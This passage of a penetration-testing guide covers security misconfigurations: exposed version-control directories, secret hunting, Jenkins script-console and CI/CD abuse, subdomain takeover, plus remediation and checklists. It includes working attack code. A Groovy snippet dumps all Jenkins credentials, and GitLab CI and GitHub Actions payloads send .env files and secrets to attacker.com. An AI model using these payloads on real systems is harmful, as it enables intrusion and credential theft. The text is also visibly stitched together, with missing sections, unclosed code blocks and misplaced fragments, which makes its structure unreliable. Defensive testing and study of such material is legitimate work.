  tar -tf $layer | grep -i "env\|config\|secret\|key\|password\|token"
  tar -xf $layer -O 2>/dev/null | strings | grep -i "password\|secret\|token\|key="
done

# Automated secret scanning in images
trivy image target-image:latest
docker run --rm -v $(pwd):/path trufflesecurity/trufflehog filesystem /path
```

---

### 6.1 Git Repository Exposure
Test for accessible `.git/` directories:

**Detection:**
```

# Direct access test
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.git/config
curl -s https://target.com/.git/index
curl -s https://target.com/.git/logs/HEAD
curl -s https://target.com/.git/refs/heads/master
curl -s https://target.com/.git/refs/heads/main

# Common paths
/.git/
/.git/HEAD
/.git/config
/.git/index
/.git/logs/
/.git/objects/
/.git/refs/
/.git/info/
/.git/hooks/
/.git/description
/.git/packed-refs
/.git/FETCH_HEAD
/.git/ORIG_HEAD
/.git/COMMIT_EDITMSG
/.git/rr-cache/
```

**Exploitation with git-dumper:**
```bash

# Download exposed git repository
git-dumper https://target.com/.git/ ./target-source

# Alternative with wget
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://target.com/.git/

# Extract source from downloaded git
cd target-source
git checkout .
git log
git show HEAD
git diff HEAD~1

# Search for secrets in history
git log --all --full-history -- .env
git log --all --full-history -- config.php
git log -p --all -S "password"
git log -p --all -S "api_key"
git log -p --all -S "secret"

# Use gitleaks
gitleaks detect --source ./target-source -v
```

**Git Metadata Analysis:**
```bash

# Extract commit history
git log --all --format="%H %an %ae %ad %s" > commits.txt

# Check for sensitive files in history
git log --all --name-only --pretty=format: | sort -u | grep -i "password\|secret\|key\|config\|env"

# Check for large files (may contain dumps)
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '$1 == "blob" && $3 > 1000000 {print $3, $4}' | sort -rn

# Extract deleted files
git log --all --full-history --diff-filter=D --name-only --pretty=format: | sort -u
```

### 6.2 SVN Exposure
Test for accessible `.svn/` directories:

**Detection:**
```

# SVN entries file
curl -s https://target.com/.svn/entries
curl -s https://target.com/.svn/wc.db
curl -s https://target.com/.svn/all-wcprops

# Manual wc.db parsing
sqlite3 .svn/wc.db ".dump"
sqlite3 .svn/wc.db "SELECT local_relpath, checksum FROM NODES"

### 6.3 Mercurial Exposure
Test for accessible `.hg/` directories:

**Detection:**
```
curl -s https://target.com/.hg/
curl -s https://target.com/.hg/requires
curl -s https://target.com/.hg/store/
curl -s https://target.com/.hg/00changelog.i
```

**Exploitation:**
```bash

# Using hg-extractor or manual download
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://target.com/.hg/

### 6.4 Environment & Config File Exposure
Hunt for exposed configuration files containing secrets:

**Common Secret Locations:**
```

# Environment files
/.env
/.env.local
/.env.production
/.env.staging
/.env.development
/.env.testing
/.env.example
/.env.backup
/.env.old
/.env.bak
/.env~
/.env.save
/.env.swp

# Application configs
/config.php
/config.inc.php
/configuration.php
/settings.php
/database.php
/db.php
/wp-config.php
/wp-config.php.bak
/config.yml
/config.yaml
/config.json
/config.xml
/config.ini
/application.ini
/parameters.yml
/secrets.yml
/credentials.json
/serviceAccount.json
/firebase-config.json
/aws-config.json
/azure-config.json
/gcp-config.json
/docker-compose.yml
/docker-compose.override.yml
/kubernetes/secrets.yaml
/k8s/secrets.yaml
/helm/values.yaml
/terraform.tfstate
/terraform.tfstate.backup
/.terraform/terraform.tfstate
/packer.json
/ansible.cfg
/inventory.ini
/group_vars/all.yml
/host_vars/localhost.yml

# Mobile configs
/GoogleService-Info.plist
/google-services.json
/Info.plist
/AndroidManifest.xml

# CI/CD configs
/.github/workflows/*.yml
/.gitlab-ci.yml
/Jenkinsfile
/bitbucket-pipelines.yml
/azure-pipelines.yml
/buildkite.yml
/.circleci/config.yml
/travis.yml
/appveyor.yml
/codeship.yml
/semaphore.yml
/drone.yml

# Package manager configs
/package.json
/composer.json
/composer.lock
/requirements.txt
/Pipfile
/Pipfile.lock
/Gemfile
/Gemfile.lock
/Cargo.toml
/Cargo.lock
/pom.xml
/build.gradle
/settings.gradle
```

**Secret Pattern Matching:**
```bash

# Grepping for secrets in exposed files
grep -ri "password\|passwd\|pwd\|secret\|token\|api_key\|apikey\|access_key\|private_key\|secret_key" .

# Specific patterns
grep -ri "AKIA" . # AWS Access Key ID
grep -ri "ghp_" . # GitHub Personal Access Token
grep -ri "glpat-" . # GitLab Personal Access Token
grep -ri "sk-" . # OpenAI/Stripe API key pattern
grep -ri "SG\." . # SendGrid API key
grep -ri "xoxb-" . # Slack Bot Token
grep -ri "sk_live_" . # Stripe Live Key

# Using trufflehog for comprehensive scanning
trufflehog filesystem ./target-source

### 7.1 Jenkins Exposure
Test for exposed Jenkins instances:

**Detection:**
```

# Common Jenkins paths
/jenkins/
/script
/scriptText
/credentials/
/configure
/systemInfo
/env-vars.html
/computer/
/job/
/view/
/pluginManager/
/userContent/
/queue/
/restart
/safeRestart
/quietDown
/cancelQuietDown
/api/
/api/json?pretty=true
/api/xml
/asynchPeople/
/systemInfo
/threadDump
/heapDump
/threaddump
/metrics/
/metrics/currentUser
/metrics/healthcheck
/metrics/ping
/metrics/threads
/metrics/memory

# Check for anonymous access
curl -s https://target.com/jenkins/api/json?pretty=true

# If returns JSON with job listings, Jenkins is exposed
```

**Script Console Exploitation:**
```groovy

# Execute commands
println "id".execute().text
println "cat /etc/passwd".execute().text

# Dump credentials
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance,
    null,
    null
)
for (c in creds) {
    println c.id + ": " + c.username + " / " + c.password
}
```

**Jenkins Credential Extraction:**
```groovy

# List all credentials
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*

def credentialsStore = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore()

credentialsStore.getCredentials(Domain.global()).each { cred ->
    if (cred instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
        println "Username/Password: ${cred.id} - ${cred.username}:${cred.password}"
    } else if (cred instanceof org.jenkinsci.plugins.plaincredentials.impl.StringCredentials) {
        println "Secret Text: ${cred.id} - ${cred.secret}"
    } else if (cred instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey) {
        println "SSH Key: ${cred.id} - ${cred.privateKeySource.getPrivateKey()}"
    }
}
```

### 7.2 GitLab CI/CD Exposure
Test for exposed GitLab instances and CI configurations:

**Detection:**
```

# Common GitLab paths
/gitlab/
/api/v4/projects
/api/v4/users
/api/v4/groups
/api/v4/snippets
/explore
/public
/help
/profile
/admin
/admin/runners
/admin/applications
/-/ci/lint
/-/variables

# Check for public projects
curl -s "https://target.com/api/v4/projects?visibility_level=20"

# Check for public snippets
curl -s "https://target.com/api/v4/snippets?visibility=public"
```

**GitLab Runner Token Abuse:**
```bash

# Register malicious runner
gitlab-runner register \
  --non-interactive \
  --url https://target.com/ \
  --registration-token REGISTRATION_TOKEN \
  --executor shell \
  --name malicious-runner

# Create .gitlab-ci.yml in forked repo:
stages:
  - exploit

exploit:
  stage: exploit
  script:
    - cat /etc/passwd
    - env | grep -i "password\|secret\|token\|key"
    - curl -d "@/builds/project/.env" https://attacker.com/exfil
  tags:
    - shared-runner-tag
```

**GitLab CI Variable Extraction:**
```bash

# Access job artifacts
curl -s "https://target.com/api/v4/projects/PROJECT_ID/jobs/JOB_ID/artifacts"

# Access job traces/logs
curl -s "https://target.com/api/v4/projects/PROJECT_ID/jobs/JOB_ID/trace"
```

### 7.3 GitHub Actions Exposure
Test for exposed GitHub workflows and secrets:

**Workflow Analysis:**
```bash

# Check for workflow files in public repos
curl -s https://api.github.com/repos/owner/repo/contents/.github/workflows

# Download workflow files
curl -s https://raw.githubusercontent.com/owner/repo/main/.github/workflows/ci.yml

# - workflow_run triggers with untrusted code checkout
```

**GitHub Actions Secret Exfiltration:**
```yaml

# If attacker can modify workflow (via PR or compromised account)
name: Exfiltrate Secrets
on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Exfiltrate
        run: |
          echo "${{ secrets.GITHUB_TOKEN }}" | base64
          echo "${{ secrets.AWS_ACCESS_KEY_ID }}" | base64
          echo "${{ secrets.DOCKER_PASSWORD }}" | base64
          env | curl -d @- https://attacker.com/exfil
```

**Self-Hosted Runner Poisoning:**
```bash

# Check runner labels in workflow files
runs-on: self-hosted
runs-on: [self-hosted, linux, x64]

### 7.4 Build Artifact Analysis
Analyze build artifacts for secret leakage:

**Artifact Locations:**
```

# Jenkins
/job/JOB_NAME/lastSuccessfulBuild/artifact/
/job/JOB_NAME/lastBuild/artifact/

# Travis CI
/repos/OWNER/REPO/builds/BUILD_ID
```

**Artifact Secret Hunting:**
```bash

# Download and analyze artifacts
unzip artifacts.zip -d artifacts/
cd artifacts/

# Search for secrets
grep -ri "password\|secret\|token\|key\|credential" .
find . -name "*.env" -o -name "*.config" -o -name "*.json" | xargs cat

# Check for compiled source with embedded secrets
strings build/binary | grep -i "password\|secret\|token"

# Check for source maps (reveal original source)
find . -name "*.js.map" | xargs cat | grep -i "password\|secret"

# APK/IPA files may contain embedded credentials
apktool d app.apk
grep -ri "api_key\|secret\|password" app/
```

---

# Check for SPF/DMARC/DKIM
dig TXT target.com
dig TXT _dmarc.target.com
dig TXT default._domainkey.target.com

# If CNAME points to deleted cloud resource -> subdomain takeover
dig CNAME subdomain.target.com

### 8.3 Email Security Misconfiguration
Test for email-related misconfigurations:

```bash

# Test for open relay
telnet mail.target.com 25
HELO attacker.com
MAIL FROM: <test@attacker.com>
RCPT TO: <victim@other.com>
DATA
Subject: Test
This is a test.
.

# Check for email enumeration via SMTP VRFY/EXPN/RCPT
VRFY root
EXPN root
RCPT TO: <admin@target.com>
```

### 8.4 Subdomain Takeover
Identify dangling DNS records vulnerable to takeover:

**Detection:**
```bash

# Using subjack
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c /usr/share/subjack/fingerprints.json -v 3

# Check WAF presence and type
wafw00f https://target.com
nmap -p 80,443 --script http-waf-detect target.com
nmap -p 80,443 --script http-waf-fingerprint target.com

# Run all misconfiguration templates
nuclei -u https://target.com -t misconfiguration/
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t technologies/

# Specific templates
nuclei -u https://target.com -t http/misconfiguration/
nuclei -u https://target.com -t http/exposed-panels/
nuclei -u https://target.com -t http/exposures/

# Cloud-specific
nuclei -u https://target.com -t cloud/
```

**Nikto:**
```bash
nikto -h https://target.com -C all -o nikto.txt
```

**Nmap NSE Scripts:**
```bash
nmap --script http-enum,http-title,http-server-header,http-methods,http-trace,http-php-version,http-wordpress-enum,http-joomla-enum,http-drupal-enum,http-git,http-svn-enum,http-config-backup,http-passwd,http-robots.txt,http-sitemap-generator,http-userdir-enum,http-vhosts,http-waf-detect,http-waf-fingerprint,http-xssed,http-backup-finder,http-default-accounts -p 80,443 target.com
```

**FFUF for Directory Discovery:**
```bash

# Backup files
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .bak,.old,.zip,.tar.gz,.sql,.txt,.xml,.json,.yml,.swp,.save,.orig -mc 200,301,302,403

# Directory listing
ffuf -u https://target.com/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200
```

# GCP
scout gcp --project-id PROJECT_ID
```

**Prowler (AWS):**
```bash
prowler aws -M csv html json
```

**CloudSploit (Multi-cloud):**
```bash

# Query AWS resources
steampipe query "select * from aws_s3_bucket where block_public_acls = false"

# Query Azure
steampipe query "select * from azure_storage_account where allow_blob_public_access = true"

# Query GCP
steampipe query "select * from gcp_storage_bucket where iam_policy -> 'bindings' @> '[{\"role\":\"roles/storage.objectViewer\"}]'"
```

# Scan S3 bucket
trufflehog s3 --bucket=target-bucket
```

**GitLeaks:**
```bash

# Protect (pre-commit hook)
gitleaks protect --staged -v
```

**Detect-Secrets:**
```bash

### 10.1 Severity Classification

**Critical (CVSS 9.0-10.0):**
- Exposed Jenkins script console with anonymous access
- Public S3 bucket containing PII/financial data/credentials
- Exposed `.git/` directory with source code and embedded secrets
- Default credentials on admin interfaces
- Exposed CI/CD pipelines allowing arbitrary code execution
- IMDSv1 SSRF leading to AWS credential compromise
- Public container registries with proprietary source code

**High (CVSS 7.0-8.9):**
- Directory listing exposing sensitive files (backups, configs, logs)
- Missing security headers enabling XSS/clickjacking
- CORS misconfiguration allowing credential theft
- Exposed admin panels without authentication
- Cloud storage with overly permissive IAM policies
- Version control exposure without immediate secrets but with source code
- Debug mode enabled in production with stack traces

**Medium (CVSS 4.0-6.9):**
- Missing non-critical security headers
- Information disclosure via verbose error messages
- Exposed sample applications
- Weak CSP policies
- Backup files exposed but not containing critical data
- Subdomain takeover without immediate impact
- DNS misconfigurations (SPF/DMARC)

**Low (CVSS 0.1-3.9):**
- Server version disclosure
- Missing X-Content-Type-Options on non-upload endpoints
- Non-sensitive directory listings
- Information disclosure via headers (X-Powered-By, Server)

### 10.2 Evidence Collection

For each finding, collect:

```
1. Full HTTP request/response showing the misconfiguration
2. Screenshots of exposed interfaces/data
3. Commands used to discover/exploit
4. Extracted data samples (sanitized if containing PII)
5. Affected URLs/endpoints complete list
6. Technology versions identified
7. Configuration snippets showing the issue
8. Business impact statement
```

### 10.3 Remediation Guidance

**Default Configurations:**
- Change all default passwords before deployment
- Remove sample applications and example pages
- Disable debug mode in production
- Implement strong password policies
- Enable MFA on all administrative interfaces

**Directory Listing & File Exposure:**
- Disable directory indexing in web server config
- Remove backup files from production
- Implement `.htaccess` or equivalent restrictions
- Use `.gitignore` properly but ensure `.git/` is blocked at server level
- Deploy WAF rules to block access to sensitive paths

**Security Headers:**
```

# Apache
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"

# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
```

**Cloud Hardening:**
- Enable S3 Block Public Access at account level
- Use least-privilege IAM policies
- Enable IMDSv2 on all EC2 instances
- Implement SCPs (Service Control Policies)
- Enable CloudTrail for all regions
- Use Azure Private Endpoints where possible
- Implement GCP VPC Service Controls
- Scan container images for secrets before push

**Version Control:**
- Block `.git/`, `.svn/`, `.hg/` at web server level
- Use `.gitignore` for sensitive files
- Implement pre-commit hooks for secret scanning
- Rotate any exposed credentials immediately
- Use git-secrets or similar tools in CI/CD

**CI/CD Security:**
- Require authentication for all CI/CD interfaces
- Implement job isolation for self-hosted runners
- Mask sensitive variables in logs
- Implement branch protection rules
- Use OIDC for cloud authentication instead of long-lived credentials
- Scan build artifacts for secrets before storage

---

### 11.1 Default Configuration Checklist
- [ ] Test default credentials on all login interfaces
- [ ] Check for default/sample application pages
- [ ] Verify debug mode is disabled in production
- [ ] Check for exposed admin panels (`/admin`, `/manager`, `/console`)
- [ ] Test for exposed API documentation (`/swagger`, `/api-docs`)
- [ ] Check for exposed monitoring endpoints (`/actuator`, `/metrics`, `/health`)
- [ ] Verify error pages don't expose stack traces
- [ ] Check for exposed database management tools (`/phpmyadmin`, `/pgadmin`)
- [ ] Test for exposed CMS admin pages (`/wp-admin`, `/administrator`)
- [ ] Check for exposed version control UIs (`/git`, `/svn`)

### 11.2 Directory Listing & File Exposure Checklist
- [ ] Test all directories for indexing (`/images/`, `/uploads/`, `/assets/`)
- [ ] Hunt for backup files (`.bak`, `.old`, `.zip`, `.tar.gz`, `.sql`)
- [ ] Hunt for editor swap files (`.swp`, `.swo`, `.save`)
- [ ] Check for exposed configuration files (`.env`, `config.php`, `web.config`)
- [ ] Check for exposed log files (`access.log`, `error.log`, `application.log`)
- [ ] Test for source code disclosure (`index.php~`, `.php.bak`)
- [ ] Check for exposed temporary directories (`/tmp/`, `/temp/`, `/cache/`)
- [ ] Hunt for archive files (`backup.zip`, `source.zip`, `www.tar.gz`)
- [ ] Check for exposed `.git/`, `.svn/`, `.hg/` directories
- [ ] Test for exposed Docker files (`Dockerfile`, `docker-compose.yml`)

### 11.3 HTTP Security Headers Checklist
- [ ] Check for `Content-Security-Policy` presence and strength
- [ ] Verify `Strict-Transport-Security` (HSTS) is set
- [ ] Check `X-Frame-Options` or CSP `frame-ancestors`
- [ ] Verify `X-Content-Type-Options: nosniff`
- [ ] Check `Referrer-Policy` is configured
- [ ] Verify `Permissions-Policy` restricts unnecessary features
- [ ] Test CORS configuration for dangerous patterns
- [ ] Check for `Cross-Origin-Resource-Policy`
- [ ] Verify `Cross-Origin-Embedder-Policy`
- [ ] Check `Cross-Origin-Opener-Policy`
- [ ] Test CSP for `unsafe-inline`, `unsafe-eval`, wildcards, `data:` URIs
- [ ] Verify no JSONP endpoints in allowed script sources

### 11.4 Cloud Misconfiguration Checklist
- [ ] Enumerate S3 buckets for public access
- [ ] Test S3 bucket policies and ACLs
- [ ] Check for public ECR repositories
- [ ] Test EC2 IMDSv1 vulnerability
- [ ] Check Lambda function environment variables
- [ ] Analyze IAM policies for over-permissive roles
- [ ] Test Azure Storage accounts for anonymous access
- [ ] Check for exposed SAS tokens
- [ ] Test GCP Storage buckets for public access
- [ ] Check Cloud Functions for public invocation
- [ ] Test container registries for anonymous pull
- [ ] Scan container images for embedded secrets
- [ ] Check for exposed cloud metadata endpoints

### 11.5 Version Control Checklist
- [ ] Test `/.git/HEAD` accessibility
- [ ] Test `/.git/config` accessibility
- [ ] Test `/.git/index` accessibility
- [ ] Test `/.git/logs/HEAD` accessibility
- [ ] Test `/.svn/entries` accessibility
- [ ] Test `/.svn/wc.db` accessibility
- [ ] Test `/.hg/requires` accessibility
- [ ] Download and analyze exposed repositories
- [ ] Search commit history for secrets
- [ ] Check for exposed `.gitignore` files
- [ ] Search for credentials in source code
- [ ] Check for exposed CI/CD configurations

### 11.6 CI/CD Pipeline Checklist
- [ ] Test Jenkins `/script` console access
- [ ] Check Jenkins credential store exposure
- [ ] Test GitLab runner registration token exposure
- [ ] Check GitLab CI job logs for secrets
- [ ] Analyze GitHub Actions workflow files
- [ ] Test for self-hosted runner poisoning
- [ ] Check build artifacts for sensitive data
- [ ] Test for hardcoded secrets in pipeline configs
- [ ] Verify branch protection rules
- [ ] Check for exposed CI/CD webhooks
- [ ] Test for pipeline parameter injection
- [ ] Verify OIDC is used instead of long-lived credentials

---

## References & Resources

**Standards & Frameworks:**
- OWASP Top 10:2021 - A05:2021 – Security Misconfiguration
- OWASP Testing Guide v4.2: Configuration and Deployment Management Testing
- CWE-16: Configuration
- CWE-200: Information Exposure
- CIS Benchmarks (AWS, Azure, GCP, Docker, Kubernetes)
- NIST SP 800-53: Configuration Management
- Cloud Security Alliance (CSA) Cloud Controls Matrix

**Tools:**
- Nuclei (ProjectDiscovery)
- Nmap with NSE scripts
- Nikto
- FFUF / Gobuster / Feroxbuster
- Git-dumper / SVN-extractor
- TruffleHog / GitLeaks / Detect-Secrets
- ScoutSuite / Prowler / CloudSploit
- Steampipe
- TestSSL.sh / SSLyze
- Subjack / Nuclei (takeover templates)
- AWS CLI / Azure CLI / gcloud CLI

**Wordlists:**
- SecLists (Discovery/Web-Content)
- Assetnote wordlists
- Raft wordlists
- Common backup extensions list
- Default credential lists

**Research & Resources:**
- PortSwigger Web Security Academy: Information Disclosure labs
- HackerOne Hacktivity: Misconfiguration reports
- CloudSecDocs (cloud security references)
- Can I Take Over XYZ? (subdomain takeover)
- PayloadsAllTheThings: Security Misconfiguration
- HackTricks: Cloud Pentesting

---
